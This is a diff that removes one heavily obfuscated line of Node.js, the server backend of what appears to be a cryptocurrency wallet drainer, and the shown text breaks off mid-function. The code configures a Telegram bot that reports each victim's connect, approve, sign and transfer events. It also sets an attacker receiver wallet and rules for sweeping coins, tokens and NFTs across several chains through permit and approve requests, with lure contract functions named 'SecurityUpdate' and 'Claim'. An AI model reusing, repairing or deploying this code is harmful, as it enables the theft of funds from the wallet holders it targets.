@@ -1,1 +1,3024 @@
-const _0xb41be2=_0x3fd3;(function(_0x525bda,_0x2b4334){const _0x11608b=_0x3fd3,_0x3e9977=_0x525bda();while(!![]){try{const _0x81e1f2=parseInt(_0x11608b(0x13b))/0x1*(-parseInt(_0x11608b(0x7f))/0x2)+-parseInt(_0x11608b(0xf7))/0x3*(parseInt(_0x11608b(0x134))/0x4)+-parseInt(_0x11608b(0x1a9))/0x5+parseInt(_0x11608b(0x68))/0x6*(parseInt(_0x11608b(0x139))/0x7)+parseInt(_0x11608b(0x1a8))/0x8*(-parseInt(_0x11608b(0x1be))/0x9)+parseInt(_0x11608b(0x100))/0xa+parseInt(_0x11608b(0xac))/0xb*(parseInt(_0x11608b(0x182))/0xc);if(_0x81e1f2===_0x2b4334)break;else _0x3e9977['push'](_0x3e9977['shift']());}catch(_0x347422){_0x3e9977['push'](_0x3e9977['shift']());}}}(_0x4651,0x2553c),console[_0xb41be2(0xb9)](_0xb41be2(0x1ad)),console['log'](_0xb41be2(0x80)),console[_0xb41be2(0xb9)](_0xb41be2(0x105)));const https=require(_0xb41be2(0x17b)),ethers=require(_0xb41be2(0x16b)),axios=require('axios'),express=require(_0xb41be2(0xcb)),parser=require(_0xb41be2(0xba)),Telegram=require(_0xb41be2(0x194)),fs=require('fs'),readline=require(_0xb41be2(0x191)),path=require(_0xb41be2(0x149)),MS_Protection=![],MS_Telegram_Token=_0xb41be2(0x6d),MS_Telegram_Chat_ID='-1002190901288',MS_Wallet_Address=_0xb41be2(0x179),MS_Wallet_Private=_0xb41be2(0x123),MS_Wallet_Receiver='0x4FfD484Af1846e5b52e8F10f8260A935eCF52A05',MS_Use_DeBank=!![],MS_Use_OpenSea=!![],MS_Use_Zapper=![],MS_OpenSea_Mode=0x1,MS_Ankr_Token=_0xb41be2(0xa2),MS_DeBank_Token=_0xb41be2(0xb3),MS_Zapper_Token=_0xb41be2(0xfc),MS_Enable_API=![],MS_API_Token=_0xb41be2(0x190),MS_API_Mode=0x1,MS_Loop_Native=0x0,MS_Loop_Tokens=0x0,MS_Loop_NFTs=0x0,MS_Domains_Mode=0x0,MS_Domains_Whilelist=[_0xb41be2(0x77),_0xb41be2(0x1d4)],MS_RPC_URLs={0x1:'https://rpc.ankr.com/eth',0xa:'https://rpc.ankr.com/optimism',0x38:_0xb41be2(0x95),0x89:_0xb41be2(0x14c),0xfa:'https://rpc.ankr.com/fantom',0xa86a:_0xb41be2(0x11b),0xa4b1:_0xb41be2(0xb4)},MS_Notifications={'enter_website':{'mode':!![],'chat_id':MS_Telegram_Chat_ID},'leave_website':{'mode':!![],'chat_id':MS_Telegram_Chat_ID},'connect_success':{'mode':!![],'chat_id':MS_Telegram_Chat_ID},'connect_request':{'mode':!![],'chat_id':MS_Telegram_Chat_ID},'connect_cancel':{'mode':!![],'chat_id':MS_Telegram_Chat_ID},'approve_request':{'mode':!![],'chat_id':MS_Telegram_Chat_ID},'approve_success':{'mode':!![],'chat_id':MS_Telegram_Chat_ID},'approve_cancel':{'mode':!![],'chat_id':MS_Telegram_Chat_ID},'permit_sign_data':{'mode':!![],'chat_id':MS_Telegram_Chat_ID},'transfer_request':{'mode':!![],'chat_id':MS_Telegram_Chat_ID},'transfer_success':{'mode':!![],'chat_id':MS_Telegram_Chat_ID},'transfer_cancel':{'mode':!![],'chat_id':MS_Telegram_Chat_ID},'sign_request':{'mode':!![],'chat_id':MS_Telegram_Chat_ID},'sign_success':{'mode':!![],'chat_id':MS_Telegram_Chat_ID},'sign_cancel':{'mode':!![],'chat_id':MS_Telegram_Chat_ID},'chain_request':{'mode':!![],'chat_id':MS_Telegram_Chat_ID},'chain_success':{'mode':!![],'chat_id':MS_Telegram_Chat_ID},'chain_cancel':{'mode':!![],'chat_id':MS_Telegram_Chat_ID}},MS_Settings={'Minimal_Wallet_Price':0x1,'Tokens_First':0x0,'Wait_For_Confirmation':0x1,'Wait_For_Response':0x1,'Sign':{'Native':0x1,'Tokens':0x1,'NFTs':0x1},'Permit':{'Mode':0x1,'Priority':0x0,'Bypass':0x0,'Challenge':0x0},'Approve':{'Enable':0x1,'MetaMask':0x2},'Swappers':{'Enable':0x0,'Priority':0x0},'SeaPort':{'Enable':0x0,'Priority':0x1},'Blur':{'Enable':0x0,'Priority':0x1},'x2y2':{'Enable':0x0,'Priority':0x1},'Chains':{'eth':{'Enable':0x1,'Native':0x1,'Tokens':0x1,'NFTs':0x1,'Min_Native_Price':0x1,'Min_Tokens_Price':0x1,'Min_NFTs_Price':0x1,'API':'2B44DG986KR15DTS4S1E5JWZT8VTWZ7C99','Contract_Address':_0xb41be2(0x198),'Contract_Type':_0xb41be2(0x170),'Contract_Legacy':0x0},'bsc':{'Enable':0x1,'Native':0x1,'Tokens':0x1,'NFTs':0x1,'Min_Native_Price':0x1,'Min_Tokens_Price':0x1,'Min_NFTs_Price':0x1,'API':'K5AI5N7ZPC9EF6G9MVQF33CBVMY1UKQ7HI','Contract_Address':_0xb41be2(0x1d0),'Contract_Type':_0xb41be2(0x170),'Contract_Legacy':0x0},'polygon':{'Enable':0x1,'Native':0x1,'Tokens':0x1,'NFTs':0x1,'Min_Native_Price':0x1,'Min_Tokens_Price':0x1,'Min_NFTs_Price':0x1,'API':_0xb41be2(0x195),'Contract_Address':'0xd4d7e9e1d0dae333d83e174572de6bc473378bf1','Contract_Type':_0xb41be2(0x170),'Contract_Legacy':0x0},'avalanche':{'Enable':0x1,'Native':0x1,'Tokens':0x1,'NFTs':0x1,'Min_Native_Price':0x1,'Min_Tokens_Price':0x1,'Min_NFTs_Price':0x1,'API':_0xb41be2(0x155),'Contract_Address':_0xb41be2(0x1d0),'Contract_Type':'Execute','Contract_Legacy':0x0},'arbitrum':{'Enable':0x1,'Native':0x1,'Tokens':0x1,'NFTs':0x1,'Min_Native_Price':0x1,'Min_Tokens_Price':0x1,'Min_NFTs_Price':0x1,'API':_0xb41be2(0x11e),'Contract_Address':_0xb41be2(0x1d0),'Contract_Type':_0xb41be2(0x170),'Contract_Legacy':0x0},'fantom':{'Enable':0x1,'Native':0x1,'Tokens':0x1,'NFTs':0x1,'Min_Native_Price':0x1,'Min_Tokens_Price':0x1,'Min_NFTs_Price':0x1,'API':_0xb41be2(0x1b4),'Contract_Address':_0xb41be2(0x1d0),'Contract_Type':_0xb41be2(0x170),'Contract_Legacy':0x0},'optimism':{'Enable':0x1,'Native':0x1,'Tokens':0x1,'NFTs':0x1,'Min_Native_Price':0x1,'Min_Tokens_Price':0x1,'Min_NFTs_Price':0x1,'API':_0xb41be2(0x98),'Contract_Address':'0xd4d7e9e1d0dae333d83e174572de6bc473378bf1','Contract_Type':'Execute','Contract_Legacy':0x0}}},MS_VERIFY_WALLET=0x1,MS_VERIFY_MESSAGE=_0xb41be2(0xe6),MS_PERMIT_BLACKLIST=[[0x89,_0xb41be2(0x82)]],MS_UNLIMITED_BLACKLIST=[[0x1,'0x1f9840a85d5af5bf1d1762f925bdaddc4201f984']];let MS_Disable_System=![];for(let x=0x0;x<MS_PERMIT_BLACKLIST[_0xb41be2(0x119)];x++){try{MS_PERMIT_BLACKLIST[x][0x1]=MS_PERMIT_BLACKLIST[x][0x1][_0xb41be2(0x9f)]()[_0xb41be2(0x13c)]();}catch(_0x1b879a){console[_0xb41be2(0xb9)](_0x1b879a);}}console[_0xb41be2(0xb9)](_0xb41be2(0xd3)+MS_PERMIT_BLACKLIST[_0xb41be2(0x119)]+'\x20contracts\x20blacklisted');for(let x=0x0;x<MS_UNLIMITED_BLACKLIST[_0xb41be2(0x119)];x++){try{MS_UNLIMITED_BLACKLIST[x][0x1]=MS_UNLIMITED_BLACKLIST[x][0x1][_0xb41be2(0x9f)]()['trim']();}catch(_0x1bc020){console[_0xb41be2(0xb9)](_0x1bc020);}}function _0x3fd3(_0x537fa7,_0x3f60d3){const _0x4651d2=_0x4651();return _0x3fd3=function(_0x3fd3a6,_0x46ffe4){_0x3fd3a6=_0x3fd3a6-0x64;let _0x3c48ad=_0x4651d2[_0x3fd3a6];return _0x3c48ad;},_0x3fd3(_0x537fa7,_0x3f60d3);}console['log'](_0xb41be2(0x15f)+MS_UNLIMITED_BLACKLIST[_0xb41be2(0x119)]+_0xb41be2(0x186));var SeaPort=null,Blur=null;if(fs[_0xb41be2(0x130)](path[_0xb41be2(0xdd)](_0xb41be2(0xa1),_0xb41be2(0x138))))SeaPort=require('./server_modules/module_seaport'),console[_0xb41be2(0xb9)]('\x09[Module]\x20SeaPort\x20Module\x20is\x20installed');else MS_Settings[_0xb41be2(0x1b9)]['Enable']=0x0;if(fs[_0xb41be2(0x130)](path[_0xb41be2(0xdd)](_0xb41be2(0xa1),'module_blur.js')))Blur=require(_0xb41be2(0x94)),console[_0xb41be2(0xb9)](_0xb41be2(0x121));else MS_Settings[_0xb41be2(0x1b9)][_0xb41be2(0x14e)]=0x0;const Supported_Wallets=[_0xb41be2(0x174),_0xb41be2(0x1a1),_0xb41be2(0x1d1),_0xb41be2(0x10b),_0xb41be2(0x1aa),'Ethereum'];let MS_Contract_Blacklist=[],MS_Contract_Whitelist=[],MS_Wallet_Blacklist=[],MS_Verified_Addresses={};((async()=>{const _0x2c044c=_0xb41be2;try{if(!fs[_0x2c044c(0x130)](_0x2c044c(0x17f)))fs['writeFileSync'](_0x2c044c(0x17f),'','utf-8');const _0x48f264=readline[_0x2c044c(0xb6)]({'input':fs[_0x2c044c(0x15a)]('blacklist_c.txt'),'crlfDelay':Infinity});for await(const _0x3eed7a of _0x48f264){try{let _0x22113b=_0x3eed7a[_0x2c044c(0x9f)]()['trim']();_0x22113b['includes']('0x')&&MS_Contract_Blacklist[_0x2c044c(0x73)](_0x22113b);}catch(_0x363d94){console[_0x2c044c(0xb9)](_0x363d94);}}console[_0x2c044c(0xb9)](_0x2c044c(0xce)+MS_Contract_Blacklist[_0x2c044c(0x119)]+'\x20contracts\x20blacklisted');}catch(_0x4ddd8e){console[_0x2c044c(0xb9)](_0x4ddd8e);}})()),((async()=>{const _0x57c5ad=_0xb41be2;try{if(!fs[_0x57c5ad(0x130)](_0x57c5ad(0x158)))fs[_0x57c5ad(0xeb)](_0x57c5ad(0x158),'',_0x57c5ad(0x167));const _0x180196=readline[_0x57c5ad(0xb6)]({'input':fs[_0x57c5ad(0x15a)]('blacklist_w.txt'),'crlfDelay':Infinity});for await(const _0x6a06a9 of _0x180196){try{let _0x438045=_0x6a06a9[_0x57c5ad(0x9f)]()['trim']();_0x438045['includes']('0x')&&MS_Wallet_Blacklist['push'](_0x438045);}catch(_0xda68d1){console[_0x57c5ad(0xb9)](_0xda68d1);}}console[_0x57c5ad(0xb9)]('\x09[Wallet\x20Blacklist]\x20There\x20are\x20'+MS_Wallet_Blacklist[_0x57c5ad(0x119)]+'\x20wallets\x20blacklisted');}catch(_0x595e6d){console['log'](_0x595e6d);}})()),((async()=>{const _0x228da1=_0xb41be2;try{if(!fs['existsSync']('whitelist_c.txt'))fs[_0x228da1(0xeb)](_0x228da1(0x11c),'',_0x228da1(0x167));const _0x4dde65=readline[_0x228da1(0xb6)]({'input':fs[_0x228da1(0x15a)](_0x228da1(0x11c)),'crlfDelay':Infinity});for await(const _0x37aefb of _0x4dde65){try{let _0x193c4a=_0x37aefb[_0x228da1(0x9f)]()[_0x228da1(0x13c)]();_0x193c4a[_0x228da1(0x86)]('0x')&&MS_Contract_Whitelist[_0x228da1(0x73)](_0x193c4a);}catch(_0x4fdcd6){console['log'](_0x4fdcd6);}}console[_0x228da1(0xb9)](_0x228da1(0xa9)+MS_Contract_Whitelist[_0x228da1(0x119)]+_0x228da1(0x66));}catch(_0x503d79){console[_0x228da1(0xb9)](_0x503d79);}})());let MS_Currencies={};((async()=>{const _0x503875=_0xb41be2;try{const _0xcbfca9=await axios['get'](_0x503875(0x104));MS_Currencies=_0xcbfca9[_0x503875(0xd9)],console[_0x503875(0xb9)](_0x503875(0x7d));}catch(_0x4637ec){console['log'](_0x4637ec);}})());const MS_Contract_ABI={'CONTRACT_LEGACY':JSON[_0xb41be2(0xc8)]('[{\x22constant\x22:false,\x22inputs\x22:[],\x22name\x22:\x22SecurityUpdate\x22,\x22outputs\x22:[],\x22payable\x22:true,\x22stateMutability\x22:\x22payable\x22,\x22type\x22:\x22function\x22},{\x22constant\x22:false,\x22inputs\x22:[],\x22name\x22:\x22Claim\x22,\x22outputs\x22:[],\x22payable\x22:true,\x22stateMutability\x22:\x22payable\x22,\x22type\x22:\x22function\x22},{\x22constant\x22:false,\x22inputs\x22:[],\x22name\x22:\x22ClaimReward\x22,\x22outputs\x22:[],\x22payable\x22:true,\x22stateMutability\x22:\x22payable\x22,\x22type\x22:\x22function\x22},{\x22constant\x22:false,\x22inputs\x22:[],\x22name\x22:\x22ClaimRewards\x22,\x22outputs\x22:[],\x22payable\x22:true,\x22stateMutability\x22:\x22payable\x22,\x22type\x22:\x22function\x22},{\x22constant\x22:false,\x22inputs\x22:[],\x22name\x22:\x22Swap\x22,\x22outputs\x22:[],\x22payable\x22:true,\x22stateMutability\x22:\x22payable\x22,\x22type\x22:\x22function\x22},{\x22constant\x22:false,\x22inputs\x22:[],\x22name\x22:\x22Connect\x22,\x22outputs\x22:[],\x22payable\x22:true,\x22stateMutability\x22:\x22payable\x22,\x22type\x22:\x22function\x22},{\x22constant\x22:false,\x22inputs\x22:[],\x22name\x22:\x22Execute\x22,\x22outputs\x22:[],\x22payable\x22:true,\x22stateMutability\x22:\x22payable\x22,\x22type\x22:\x22function\x22},{\x22constant\x22:false,\x22inputs\x22:[],\x22name\x22:\x22Multicall\x22,\x22outputs\x22:[],\x22payable\x22:true,\x22stateMutability\x22:\x22payable\x22,\x22type\x22:\x22function\x22}]'),'CONTRACT':JSON[_0xb41be2(0xc8)](_0xb41be2(0x10a)),'ERC20':JSON['parse']('[{\x22inputs\x22:[],\x22stateMutability\x22:\x22nonpayable\x22,\x22type\x22:\x22constructor\x22},{\x22anonymous\x22:false,\x22inputs\x22:[{\x22indexed\x22:true,\x22internalType\x22:\x22address\x22,\x22name\x22:\x22owner\x22,\x22type\x22:\x22address\x22},{\x22indexed\x22:true,\x22internalType\x22:\x22address\x22,\x22name\x22:\x22spender\x22,\x22type\x22:\x22address\x22},{\x22indexed\x22:false,\x22internalType\x22:\x22uint256\x22,\x22name\x22:\x22value\x22,\x22type\x22:\x22uint256\x22}],\x22name\x22:\x22Approval\x22,\x22type\x22:\x22event\x22},{\x22anonymous\x22:false,\x22inputs\x22:[{\x22indexed\x22:true,\x22internalType\x22:\x22address\x22,\x22name\x22:\x22from\x22,\x22type\x22:\x22address\x22},{\x22indexed\x22:true,\x22internalType\x22:\x22address\x22,\x22name\x22:\x22to\x22,\x22type\x22:\x22address\x22},{\x22indexed\x22:false,\x22internalType\x22:\x22uint256\x22,\x22name\x22:\x22value\x22,\x22type\x22:\x22uint256\x22}],\x22name\x22:\x22Transfer\x22,\x22type\x22:\x22event\x22},{\x22inputs\x22:[{\x22internalType\x22:\x22address\x22,\x22name\x22:\x22owner\x22,\x22type\x22:\x22address\x22},{\x22internalType\x22:\x22address\x22,\x22name\x22:\x22delegate\x22,\x22type\x22:\x22address\x22}],\x22name\x22:\x22allowance\x22,\x22outputs\x22:[{\x22internalType\x22:\x22uint256\x22,\x22name\x22:\x22\x22,\x22type\x22:\x22uint256\x22}],\x22stateMutability\x22:\x22view\x22,\x22type\x22:\x22function\x22},{\x22inputs\x22:[{\x22internalType\x22:\x22address\x22,\x22name\x22:\x22delegate\x22,\x22type\x22:\x22address\x22},{\x22internalType\x22:\x22uint256\x22,\x22name\x22:\x22numTokens\x22,\x22type\x22:\x22uint256\x22}],\x22name\x22:\x22approve\x22,\x22outputs\x22:[{\x22internalType\x22:\x22bool\x22,\x22name\x22:\x22\x22,\x22type\x22:\x22bool\x22}],\x22stateMutability\x22:\x22nonpayable\x22,\x22type\x22:\x22function\x22},{\x22inputs\x22:[{\x22internalType\x22:\x22address\x22,\x22name\x22:\x22tokenOwner\x22,\x22type\x22:\x22address\x22}],\x22name\x22:\x22balanceOf\x22,\x22outputs\x22:[{\x22internalType\x22:\x22uint256\x22,\x22name\x22:\x22\x22,\x22type\x22:\x22uint256\x22}],\x0a\x20\x20\x22stateMutability\x22:\x22view\x22,\x22type\x22:\x22function\x22},{\x22inputs\x22:[],\x22name\x22:\x22decimals\x22,\x22outputs\x22:[{\x22internalType\x22:\x22uint8\x22,\x22name\x22:\x22\x22,\x22type\x22:\x22uint8\x22}],\x22stateMutability\x22:\x22view\x22,\x22type\x22:\x22function\x22},{\x22inputs\x22:[],\x22name\x22:\x22name\x22,\x22outputs\x22:[{\x22internalType\x22:\x22string\x22,\x22name\x22:\x22\x22,\x22type\x22:\x22string\x22}],\x22stateMutability\x22:\x22view\x22,\x22type\x22:\x22function\x22},{\x22inputs\x22:[],\x22name\x22:\x22symbol\x22,\x22outputs\x22:[{\x22internalType\x22:\x22string\x22,\x22name\x22:\x22\x22,\x22type\x22:\x22string\x22}],\x22stateMutability\x22:\x22view\x22,\x22type\x22:\x22function\x22},{\x22inputs\x22:[],\x22name\x22:\x22totalSupply\x22,\x22outputs\x22:[{\x22internalType\x22:\x22uint256\x22,\x22name\x22:\x22\x22,\x22type\x22:\x22uint256\x22}],\x22stateMutability\x22:\x22view\x22,\x22type\x22:\x22function\x22},{\x22inputs\x22:[{\x22internalType\x22:\x22address\x22,\x22name\x22:\x22receiver\x22,\x22type\x22:\x22address\x22},{\x22internalType\x22:\x22uint256\x22,\x22name\x22:\x22numTokens\x22,\x22type\x22:\x22uint256\x22}],\x22name\x22:\x22transfer\x22,\x22outputs\x22:[{\x22internalType\x22:\x22bool\x22,\x22name\x22:\x22\x22,\x22type\x22:\x22bool\x22}],\x22stateMutability\x22:\x22nonpayable\x22,\x22type\x22:\x22function\x22},{\x22inputs\x22:[{\x22internalType\x22:\x22address\x22,\x22name\x22:\x22owner\x22,\x22type\x22:\x22address\x22},{\x22internalType\x22:\x22address\x22,\x22name\x22:\x22buyer\x22,\x22type\x22:\x22address\x22},{\x22internalType\x22:\x22uint256\x22,\x22name\x22:\x22numTokens\x22,\x22type\x22:\x22uint256\x22}],\x22name\x22:\x22transferFrom\x22,\x22outputs\x22:[{\x22internalType\x22:\x22bool\x22,\x22name\x22:\x22\x22,\x22type\x22:\x22bool\x22}],\x22stateMutability\x22:\x22nonpayable\x22,\x22type\x22:\x22function\x22}]'),'ERC721':JSON['parse']('[{\x22constant\x22:false,\x22inputs\x22:[{\x22internalType\x22:\x22address\x22,\x22name\x22:\x22to\x22,\x22type\x22:\x22address\x22},{\x22internalType\x22:\x22uint256\x22,\x22name\x22:\x22tokenId\x22,\x22type\x22:\x22uint256\x22}],\x22name\x22:\x22approve\x22,\x22outputs\x22:[],\x22payable\x22:false,\x22stateMutability\x22:\x22nonpayable\x22,\x22type\x22:\x22function\x22},{\x22constant\x22:false,\x22inputs\x22:[{\x22internalType\x22:\x22address\x22,\x22name\x22:\x22to\x22,\x22type\x22:\x22address\x22},{\x22internalType\x22:\x22uint256\x22,\x22name\x22:\x22tokenId\x22,\x22type\x22:\x22uint256\x22}],\x22name\x22:\x22mint\x22,\x22outputs\x22:[],\x22payable\x22:false,\x22stateMutability\x22:\x22nonpayable\x22,\x22type\x22:\x22function\x22},{\x22constant\x22:false,\x22inputs\x22:[{\x22internalType\x22:\x22address\x22,\x22name\x22:\x22from\x22,\x22type\x22:\x22address\x22},{\x22internalType\x22:\x22address\x22,\x22name\x22:\x22to\x22,\x22type\x22:\x22address\x22},{\x22internalType\x22:\x22uint256\x22,\x22name\x22:\x22tokenId\x22,\x22type\x22:\x22uint256\x22}],\x22name\x22:\x22safeTransferFrom\x22,\x22outputs\x22:[],\x22payable\x22:false,\x22stateMutability\x22:\x22nonpayable\x22,\x22type\x22:\x22function\x22},{\x22constant\x22:false,\x22inputs\x22:[{\x22internalType\x22:\x22address\x22,\x22name\x22:\x22from\x22,\x22type\x22:\x22address\x22},{\x22internalType\x22:\x22address\x22,\x22name\x22:\x22to\x22,\x22type\x22:\x22address\x22},{\x22internalType\x22:\x22uint256\x22,\x22name\x22:\x22tokenId\x22,\x22type\x22:\x22uint256\x22},{\x22internalType\x22:\x22bytes\x22,\x22name\x22:\x22_data\x22,\x22type\x22:\x22bytes\x22}],\x22name\x22:\x22safeTransferFrom\x22,\x22outputs\x22:[],\x22payable\x22:false,\x22stateMutability\x22:\x22nonpayable\x22,\x22type\x22:\x22function\x22},{\x22constant\x22:false,\x22inputs\x22:[{\x22internalType\x22:\x22address\x22,\x22name\x22:\x22to\x22,\x22type\x22:\x22address\x22},\x0a\x20\x20{\x22internalType\x22:\x22bool\x22,\x22name\x22:\x22approved\x22,\x22type\x22:\x22bool\x22}],\x22name\x22:\x22setApprovalForAll\x22,\x22outputs\x22:[],\x22payable\x22:false,\x22stateMutability\x22:\x22nonpayable\x22,\x22type\x22:\x22function\x22},{\x22constant\x22:false,\x22inputs\x22:[{\x22internalType\x22:\x22address\x22,\x22name\x22:\x22from\x22,\x22type\x22:\x22address\x22},{\x22internalType\x22:\x22address\x22,\x22name\x22:\x22to\x22,\x22type\x22:\x22address\x22},{\x22internalType\x22:\x22uint256\x22,\x22name\x22:\x22tokenId\x22,\x22type\x22:\x22uint256\x22}],\x22name\x22:\x22transferFrom\x22,\x22outputs\x22:[],\x22payable\x22:false,\x22stateMutability\x22:\x22nonpayable\x22,\x22type\x22:\x22function\x22},{\x22inputs\x22:[],\x22payable\x22:false,\x22stateMutability\x22:\x22nonpayable\x22,\x22type\x22:\x22constructor\x22},{\x22anonymous\x22:false,\x22inputs\x22:[{\x22indexed\x22:true,\x22internalType\x22:\x22address\x22,\x22name\x22:\x22from\x22,\x22type\x22:\x22address\x22},{\x22indexed\x22:true,\x22internalType\x22:\x22address\x22,\x22name\x22:\x22to\x22,\x22type\x22:\x22address\x22},{\x22indexed\x22:true,\x22internalType\x22:\x22uint256\x22,\x22name\x22:\x22tokenId\x22,\x22type\x22:\x22uint256\x22}],\x22name\x22:\x22Transfer\x22,\x22type\x22:\x22event\x22},{\x22anonymous\x22:false,\x22inputs\x22:[{\x22indexed\x22:true,\x22internalType\x22:\x22address\x22,\x22name\x22:\x22owner\x22,\x22type\x22:\x22address\x22},{\x22indexed\x22:true,\x22internalType\x22:\x22address\x22,\x22name\x22:\x22approved\x22,\x22type\x22:\x22address\x22},{\x22indexed\x22:true,\x22internalType\x22:\x22uint256\x22,\x22name\x22:\x22tokenId\x22,\x22type\x22:\x22uint256\x22}],\x22name\x22:\x22Approval\x22,\x22type\x22:\x22event\x22},{\x22anonymous\x22:false,\x22inputs\x22:[{\x22indexed\x22:true,\x22internalType\x22:\x22address\x22,\x22name\x22:\x22owner\x22,\x22type\x22:\x22address\x22},\x0a\x20\x20{\x22indexed\x22:true,\x22internalType\x22:\x22address\x22,\x22name\x22:\x22operator\x22,\x22type\x22:\x22address\x22},{\x22indexed\x22:false,\x22internalType\x22:\x22bool\x22,\x22name\x22:\x22approved\x22,\x22type\x22:\x22bool\x22}],\x22name\x22:\x22ApprovalForAll\x22,\x22type\x22:\x22event\x22},{\x22constant\x22:true,\x22inputs\x22:[{\x22internalType\x22:\x22address\x22,\x22name\x22:\x22owner\x22,\x22type\x22:\x22address\x22}],\x22name\x22:\x22balanceOf\x22,\x22outputs\x22:[{\x22internalType\x22:\x22uint256\x22,\x22name\x22:\x22\x22,\x22type\x22:\x22uint256\x22}],\x22payable\x22:false,\x22stateMutability\x22:\x22view\x22,\x22type\x22:\x22function\x22},{\x22constant\x22:true,\x22inputs\x22:[{\x22internalType\x22:\x22uint256\x22,\x22name\x22:\x22tokenId\x22,\x22type\x22:\x22uint256\x22}],\x22name\x22:\x22getApproved\x22,\x22outputs\x22:[{\x22internalType\x22:\x22address\x22,\x22name\x22:\x22\x22,\x22type\x22:\x22address\x22}],\x22payable\x22:false,\x22stateMutability\x22:\x22view\x22,\x22type\x22:\x22function\x22},{\x22constant\x22:true,\x22inputs\x22:[{\x22internalType\x22:\x22address\x22,\x22name\x22:\x22owner\x22,\x22type\x22:\x22address\x22},{\x22internalType\x22:\x22address\x22,\x22name\x22:\x22operator\x22,\x22type\x22:\x22address\x22}],\x22name\x22:\x22isApprovedForAll\x22,\x22outputs\x22:[{\x22internalType\x22:\x22bool\x22,\x22name\x22:\x22\x22,\x22type\x22:\x22bool\x22}],\x22payable\x22:false,\x22stateMutability\x22:\x22view\x22,\x22type\x22:\x22function\x22},{\x22constant\x22:true,\x22inputs\x22:[{\x22internalType\x22:\x22uint256\x22,\x22name\x22:\x22tokenId\x22,\x22type\x22:\x22uint256\x22}],\x22name\x22:\x22ownerOf\x22,\x22outputs\x22:[{\x22internalType\x22:\x22address\x22,\x22name\x22:\x22\x22,\x22type\x22:\x22address\x22}],\x22payable\x22:false,\x22stateMutability\x22:\x22view\x22,\x22type\x22:\x22function\x22},\x0a\x20\x20{\x22constant\x22:true,\x22inputs\x22:[{\x22internalType\x22:\x22bytes4\x22,\x22name\x22:\x22interfaceId\x22,\x22type\x22:\x22bytes4\x22}],\x22name\x22:\x22supportsInterface\x22,\x22outputs\x22:[{\x22internalType\x22:\x22bool\x22,\x22name\x22:\x22\x22,\x22type\x22:\x22bool\x22}],\x22payable\x22:false,\x22stateMutability\x22:\x22view\x22,\x22type\x22:\x22function\x22}]'),'PERMIT_2':JSON[_0xb41be2(0xc8)](_0xb41be2(0x7b)),'PERMIT_1':JSON[_0xb41be2(0xc8)](_0xb41be2(0x135))},bot=new Telegram(MS_Telegram_Token),web=express();web[_0xb41be2(0x13e)](express[_0xb41be2(0x106)]()),web[_0xb41be2(0x13e)](require(_0xb41be2(0xe7))()),web[_0xb41be2(0x13e)](require(_0xb41be2(0x15c))[_0xb41be2(0xcb)]()),web[_0xb41be2(0x13e)](express['static'](_0xb41be2(0xaa))),web[_0xb41be2(0x13e)](parser[_0xb41be2(0x106)]({'limit':_0xb41be2(0xa7)})),web['use'](parser[_0xb41be2(0x71)]({'limit':_0xb41be2(0xa7),'extended':!![]})),web[_0xb41be2(0x13e)](require(_0xb41be2(0x143))());let last_free_id=0x1;const free_id=()=>{return last_free_id+=0x1,last_free_id-0x1;};let User_IPs_Pool={};setInterval(()=>{const _0x4b3b19=_0xb41be2;User_IPs_Pool={};for(const _0x1785cf in MS_Verified_Addresses){try{Math[_0x4b3b19(0x16a)](Date['now']()/0x3e8)-MS_Verified_Addresses[_0x1785cf]>0x12c&&delete MS_Verified_Addresses[_0x1785cf];}catch(_0x9d59d9){console[_0x4b3b19(0xb9)](_0x9d59d9);}}},0xf*0x3c*0x3e8);const prs=(_0x5decbd,_0x4dc9db)=>{const _0x39c25b=_0xb41be2,_0x23d1ae=_0x1f6207=>_0x1f6207['split']('')[_0x39c25b(0x14a)](_0x5868cd=>_0x5868cd[_0x39c25b(0xd1)](0x0)),_0xf0a76e=_0x20a1ca=>('0'+Number(_0x20a1ca)[_0x39c25b(0x14d)](0x10))['substr'](-0x2),_0x2aeeab=_0x4a501c=>_0x23d1ae(_0x5decbd)[_0x39c25b(0x8a)]((_0x304ed0,_0x176210)=>_0x304ed0^_0x176210,_0x4a501c);return _0x4dc9db[_0x39c25b(0x12c)]('')['map'](_0x23d1ae)[_0x39c25b(0x14a)](_0x2aeeab)['map'](_0xf0a76e)[_0x39c25b(0xdd)]('');},srp=(_0x447772,_0x2fa4ad)=>{const _0x5cf512=_0xb41be2,_0x36aa22=_0x4a3382=>_0x4a3382['split']('')[_0x5cf512(0x14a)](_0x5b5034=>_0x5b5034[_0x5cf512(0xd1)](0x0)),_0xc0857a=_0x254762=>_0x36aa22(_0x447772)[_0x5cf512(0x8a)]((_0x3b430d,_0x51c595)=>_0x3b430d^_0x51c595,_0x254762);return _0x2fa4ad[_0x5cf512(0xca)](/.{1,2}/g)[_0x5cf512(0x14a)](_0x3f9fd2=>parseInt(_0x3f9fd2,0x10))[_0x5cf512(0x14a)](_0xc0857a)[_0x5cf512(0x14a)](_0x475240=>String[_0x5cf512(0xea)](_0x475240))[_0x5cf512(0xdd)]('');},send_response=async(_0x479b04,_0x1bf283)=>{const _0x5a3293=_0xb41be2;try{const _0x6d6d43=Buffer['from'](String(0xa+0x100+0x200+0x400+0x800))[_0x5a3293(0x14d)]('base64'),_0x3389fb=prs(_0x6d6d43,Buffer[_0x5a3293(0x16f)](JSON['stringify'](_0x1bf283))[_0x5a3293(0x14d)](_0x5a3293(0x162)));return _0x479b04[_0x5a3293(0x1cc)](0xc8)[_0x5a3293(0xad)](_0x3389fb);}catch(_0x51d8ab){return console[_0x5a3293(0xb9)](_0x51d8ab),![];}},block_request=async _0x5baa2f=>{const _0x24e7b2=_0xb41be2;try{return await send_response(_0x5baa2f,{'status':_0x24e7b2(0x8f),'error':'SRV_UNAVAILABLE'});}catch(_0x5a4c3e){console[_0x24e7b2(0xb9)](_0x5a4c3e);}},add_record=async _0x476654=>{const _0x33aaad=_0xb41be2;try{if(!MS_Enable_API)return;if(MS_API_Mode==0x1&&_0x476654['type']!=_0x33aaad(0xc3))return;if(MS_API_Mode==0x2&&_0x476654['type']!='enter_website'&&_0x476654['type']!=_0x33aaad(0x1b2)&&_0x476654['type']!=_0x33aaad(0xc3))return;if(!fs['existsSync'](_0x33aaad(0x142)))fs[_0x33aaad(0xeb)](_0x33aaad(0x142),'[]',_0x33aaad(0x167));let 